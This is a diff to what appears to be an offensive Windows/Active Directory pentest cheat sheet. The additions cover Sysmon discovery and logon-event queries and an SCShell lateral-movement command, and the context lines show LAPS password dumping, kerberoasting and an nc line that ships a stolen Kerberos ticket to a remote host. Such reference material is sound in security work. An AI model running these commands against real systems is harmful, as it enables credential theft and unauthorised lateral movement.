@@ -69,6 +69,9 @@ Get-WmiObject Win32_LoggedOnUser # Display logon users
 Get-LocalUser | ft Name, Enabled, LastLogon
 Get-ChildItem C:\Users -Force | select Name
 klist sessions # Displays a list of logon sessions on this computer.
+Get-WinEvent -FilterHashtable @{ LogName='Security'; Id='4624' } # Successful logons
+Get-WinEvent -FilterHashtable @{ LogName='Security'; Id='4648' } # Logons with explicit credentials
+Get-WinEvent -FilterHashtable @{ LogName='security'; Id='4634' } # Account logoffs
 ```
 
 1) Check for recently run commands and recent documents
@@ -221,6 +224,21 @@ This means that they we have one of those accounts, we can query the Domain Cont
 ldapsearch -x -h 192.168.80.10 -D "USERNAME" -w PASSWORD -b "dc=BASELDAP,dc=info" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 ```
 
+##### Sysmon
+
+
+
+```bash
+Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
+Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
+Get-Service | where-object {$_.DisplayName -like "*sysm*"}
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
+ls HKCU:\Software\Sysinternals
+sysmon -c
+findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*
+(Get-SysmonConfiguration).Rules
+```
+
 ##### Powershell Transcript
 
 The Start-Transcript and Stop-transcript cmdlets let you record all of your activities in the PowerShell console to a text file.
@@ -233,7 +251,7 @@ Stop-Transcript # Stop recording
 
 ##### PowerShell Constrained Language Mode
 
-Constrained language mode limits the capability of PowerShell to base functionality removing advanced feature support such as .Net & Windows API calls and COM access. 
+Constrained language mode limits the capability of PowerShell to base functionality removing advanced feature support such as .Net & Windows API calls and COM access.
 
 ```powershell
 $ExecutionContext.SessionState.LanguageMode
@@ -764,7 +782,7 @@ Check for the following access tokens
 |SeCreateToken|Admin|3rd party tool|
 |SeDebug|Admin|PowerShell|<https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1>|
 |SeImpersonatePrivilege|Admin|[https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)|
-|SeLoadDriver|Admin|[EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/|
+|SeLoadDriver|Admin|[EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/)|
 |SeRestore|Admin||
 |SeTakeOwnership|Admin||
 |SeTcb|Admin||
@@ -1735,15 +1753,14 @@ The password for the KDC account is used to derive a secret key for encrypting a
 
 |Account Name|SID & RID|
 |-|-|
-|Administrator account|S-1-5-<domain>-500|
-|Guest account|S-1-5-<domain>-501|
-|KRBTGT account|S-1-5-<domain>-502|
+|Administrator account|S-1-5-\<domain>-500|
+|Guest account|S-1-5-\<domain>-501|
+|KRBTGT account|S-1-5-\<domain>-502|
 
 Group Types:
 
 Distribution groups: used for email distribution lists and cannot be used to control access to resources
 Security Groups: which CAN be used to control access and added into discretionary access control lists (DACLs).
-
 
 *Group scopes*
 
@@ -1882,7 +1899,7 @@ Every domain controller in the forest has a replica of the same schema partition
 Every domain controller in the forest has a replica of the same configuration partition.
 *Within this partition, we can get all domains information of the forest*
 
-- **Domain Partition**: The domain partition contains the directory objects, such as users and computers, associated with the local domain. A domain can have multiple domain controllers and a forest can have multiple domains. 
+- **Domain Partition**: The domain partition contains the directory objects, such as users and computers, associated with the local domain. A domain can have multiple domain controllers and a forest can have multiple domains.
 Each domain controller stores a full replica of the domain partition for its local domain, but does not store replicas of the domain partitions for other domains.
 
 #### ASREPRoast
@@ -2143,7 +2160,7 @@ The Security Account Manager is a database file in Windows XP, Windows Vista, Wi
 This file can be found in *%SystemRoot%/system32/config/SAM* and is mounted on *HKLM/SAM*
 The Security Account Manager contains all the credentials that are **local** to that specific computer, including the built-in local Administrator account and any other local accounts for that computer.
 
-In an attempt to improve the security of the SAM database against offline software cracking, Microsoft introduced the SYSKEY function. 
+In an attempt to improve the security of the SAM database against offline software cracking, Microsoft introduced the SYSKEY function.
 When SYSKEY is enabled, the on-disk copy of the SAM file is partially encrypted, so that the password hash values for all local accounts stored in the SAM are encrypted with a key (usually also referred to as the "SYSKEY").
 
 *Sidenote: For NT password hash, it is an unsalted MD4 hash of the account’s password. This means that if two accounts use an identical password, they will also have an identical NT password hash.*
@@ -2479,15 +2496,10 @@ nc -lvp 443 > kerberoast.bin
 Get-NetUser -SPN # Using PowerSploit
 Get-ADObject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}
 
-
-
-
 Add-Type -AssemblyName System.IdentityModel  
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/dc-mantvydas.offense.local"
 
-
 nc 10.0.0.5 443 < C:\tools\mimikatz\x64\2-40a10000-spotless@HTTP~dc-mantvydas.offense.local-OFFENSE.LOCAL.kirbi
-
 ```
 
 Extract the hash from memory
@@ -2620,7 +2632,7 @@ By using this DCOM application and the associated method, it is possible to pivo
 - **ShellWindows** *(9BA05972-F6A8-11CF-A442-00A0C90A8F39)*: Represents a collection of the open windows that belong to the Shell. Methods associated with this objects can control and execute commands within the Shell, and obtain other Shell-related objects.
 - **ShellBrowserWindow** *(C08AFD90-F2A1-11D1-8455-00A0C91F3880)*: Creates a new instance of Windows Explorer
 - **Shell.Application**: *(13709620-c279-11ce-a49e-444553540000)*
-- **HTML Application**: *(3050F4D8-98B5-11CF-BB82-00AA00BDCE0B)*: 
+- **HTML Application**: *(3050F4D8-98B5-11CF-BB82-00AA00BDCE0B)*:
 - ...
 
 DCOM applications can access the network and execute commands.
@@ -2631,6 +2643,16 @@ Here below is a the command to get a list of DCOM application
 Get-CimInstance Win32_DCOMApplication
 ```
 
+##### Lateral Movement with Service Configuration Manager
+
+[SCShell](https://github.com/Mr-Un1k0d3r/SCShell) is a fileless lateral movement tool that relies on [ChangeServiceConfigA](https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-changeserviceconfiga) to run commands. The beauty of this tool is that it does not perform authentication against SMB. Everything is performed over DCERPC.
+
+```bash
+.\scshell.exe TARGET SERVICE "C:\windows\system32\cmd.exe /c echo 'lateral hello' > c:\temp\lat.txt" username password
+```
+
+A service that can be used is XblAuthManager
+
 ###### LethalHTA
 
 ```powershell
@@ -2638,8 +2660,6 @@ LethalHTADotNet.exe IP URL_HTA
 ```
 
 To detect our technique you can watch for files inside the INetCache (%windir%\[System32 or SysWOW64]\config\systemprofile\AppData\Local\Microsoft\Windows\INetCache\IE\) folder containing "ActiveXObject". This is due to mshta.exe caching the payload file. Furthermore it can be detected by an mshta.exe process spawned by svchost.exe.
-
-
 
 ###### Arbitrary Command Line Execution through Excell DDE
 
@@ -2908,12 +2928,6 @@ Active Directory will take the ACL of the AdminSDHolder object and apply it to a
 The AdminSDHolder permissions are pushed down to all protected objects by a process SDProp.
 
 That means if an administrator sees an inappropriate permission on a protected object and removes it, within an hour **those permissions will be put back in place by SDProp**.
-
-#### ForeignSecurityPrincipal
-
-/ /  To Finish
-
-https://www.quest.com/community/migration-manager-for-ad/f/forum/30719/foreign-security-principal-objects-belongs-to-local-internal-domain-accounts-instead-of-trusted-external-domain-accounts
 
 ###### *If you don't know, now you know : [Foreign Security Principals](https://social.technet.microsoft.com/wiki/contents/articles/51367.active-directory-foreign-security-principals-and-special-identities.aspx)*
 
